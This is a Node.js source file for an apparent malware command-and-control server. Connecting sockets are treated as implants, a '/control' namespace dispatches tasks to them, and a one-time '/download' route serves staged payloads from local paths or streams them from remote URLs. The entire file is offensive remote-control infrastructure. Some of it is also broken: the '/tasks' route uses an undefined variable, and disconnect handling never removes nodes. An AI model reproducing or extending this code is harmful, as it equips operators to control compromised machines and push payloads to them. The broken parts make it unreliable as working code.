const fs = require('fs');
const got = require('got');
const path = require('path');
const app = require('express')();
const http = require('http').Server(app);
const io = require('socket.io')(http);

const config = require('./config');
const Node = require('./implant');
const Files = require('./files');
const { LOG, TASK } = require('./logging');

const nodes = {}

const nsp = io.of("/control");
nsp.on("connection", socket => {
    LOG(`Controller connected`);

    socket.on("send", (task, callback) => {
        if (Object.keys(nodes).length > 0) {
            nodes[Object.keys(nodes)[0]].sendTask(task).then((res) => {
                callback(res);
            });
        } else {
            callback({ error: "No nodes connected" });
        }
    });
    socket.on("disconnect", () => LOG(`Controller disconnected`));
});

io.on('connection', (socket) => {
    nodes[socket.id] = new Node(socket)
});

io.on('disconnect', (socket) => delete nodes[socket.id]);

app.get('/download/:fileID', (req, res, next) => {
    const fileID = req.params.fileID
    if (fileID in Files) {
        const filePath = Files[fileID]
        res.attachment(path.basename(filePath));

        if (filePath.startsWith("http")) {
            const stream = got.stream(filePath);
            stream.on('error', err => next(err));
            stream.pipe(res);
        } else {
            const fileStream = fs.createReadStream(filePath);
            fileStream.on('open', () => fileStream.pipe(res));
            fileStream.on('error', err => next(err));
        }

        LOG(`File fetched with ID ${fileID}`);
        delete Files[fileID]
    } else {
        res.status(404).send('File not found.')
    }
})

app.get('/tasks', (req, res) => res.json(tasks));

http.listen(config.PORT, function () {
    LOG(`Listening on ${config.PORT}`)
});